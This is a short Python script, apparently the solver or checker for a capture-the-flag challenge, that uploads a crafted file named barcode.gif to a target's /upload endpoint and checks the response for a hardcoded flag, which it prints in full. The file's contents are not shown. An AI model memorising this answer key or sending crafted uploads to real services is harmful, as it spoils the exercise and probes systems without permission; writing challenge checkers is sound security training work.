import sys, requests

def main():
    flag = "magpie{80s_m0v135_4r3_th3_b35t}"
    if (len(sys.argv) != 2):
        print("Error: missing http://<address>:<port> as argument")
        exit(1)
        
    ip = sys.argv[1]

    code = open("barcode.gif", "rb")
    r = requests.post(ip + "/upload", files={"uploaded_file": code})

    if (flag in r.text):
        print("Flag retrieved successfully")
    else:
        print("Error: Flag not retrieved")

main()